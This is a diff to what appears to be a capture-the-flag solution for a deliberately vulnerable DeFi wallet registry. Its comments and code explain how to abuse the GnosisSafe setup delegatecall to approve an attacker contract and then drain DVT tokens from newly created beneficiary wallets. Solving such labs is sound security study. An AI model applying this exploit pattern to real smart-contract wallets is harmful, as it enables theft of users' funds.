@@ -187,13 +187,13 @@ contract WalletRegistry is IProxyCreationCallback, Ownable {
 //  /// @param data Data payload for optional delegate call.
 //
 // This suggests that we can have the GnosisSafeProxy, after it has been created & initialized, 
-// execute an arbitrary call with arbitrary parameters that we control. We could use this
+// delegatecall an arbitrary function with arbitrary parameters that we control. We could use this
 // to make it delegatecall a function in our attack contract which can execute arbitrary code
 // using the GnosisSafeProxy context.
 //
 // This function can simply call approve() on DVT contract to approve our attack contract as a spender,
 // then when control returns to our attack contract after GnosisSafeProxyFactory finishes, call transferFrom() 
-// on the DVT contract to steal the tokens :-) Traction execution flow through code to verify:
+// on the DVT contract to steal the tokens :-) Tracking execution flow through the code to verify:
 //
 // GnosisSafe.setup(..,to,data,..) 
 // -> ModuleManager.setupModules(to, data) 
@@ -207,13 +207,13 @@ contract WalletRegistry is IProxyCreationCallback, Ownable {
 // Attack:
 //
 // 1) For each beneficiary, call GnosisSafeProxyFactory.createProxyWithCallback()
-// with initializer proxy which will call GnosisSafe.setup() + delegatecall on DVT contract
-// to delegatecall into a function we control that will approve our attack contract as spender
+// with initializer payload to call GnosisSafe.setup() + delegatecall into a function 
+// we control that will approve our attack contract as spender
 //
 // 2) Call DVT.transferFrom() to drain tokens via newly created GnosisSafeProxy wallet
 //
 
-// the challenge requires we complete it 1 transaction, so the main attack must happen
+// the challenge requires we complete it in 1 transaction, so the main attack must happen
 // in attack contract constructor. Hence that constructor needs to create this additional contract
 // so that this external function can exist allowing GnosisSafeProxy to delegatecall() to it
 contract DelegateCallbackAttack {
@@ -240,7 +240,6 @@ contract WalletRegistryAttack {
         for (uint8 i = 0; i < _initialBeneficiaries.length;) {       
             // corresponds to GnosisSafe.setup(address[] calldata _owners) - the owners of this
             // safe, in our case each safe will have one owner, the beneficiary.
-            //address[1] memory owners = [_initialBeneficiaries[i]];
             address[] memory owners = new address[](1);
             owners[0] = _initialBeneficiaries[i];
 
@@ -273,9 +272,10 @@ contract WalletRegistryAttack {
             );
 
             // At this point the GnosisSafeFactory has deployed & initialized the new GnosisSafeProxy,
-            // and has used delegatecall() to execute callback function & call DVT.approve() with GnosisSafeProxy context,
-            // making our attack contract an the approved spender. All that is left to do is directly
-            // call DVT.transferFrom() with new proxy address to drain wallet
+            // and has used delegatecall() to execute our attack callback function which
+            // called DVT.approve() with GnosisSafeProxy context, making our attack contract 
+            // an the approved spender. All that is left to do is directly call DVT.transferFrom() 
+            // with new proxy address to drain wallet
             require(token.allowance(address(safeProxy), address(this)) == DRAIN_AMOUNT);
             token.transferFrom(address(safeProxy), msg.sender, DRAIN_AMOUNT);
 
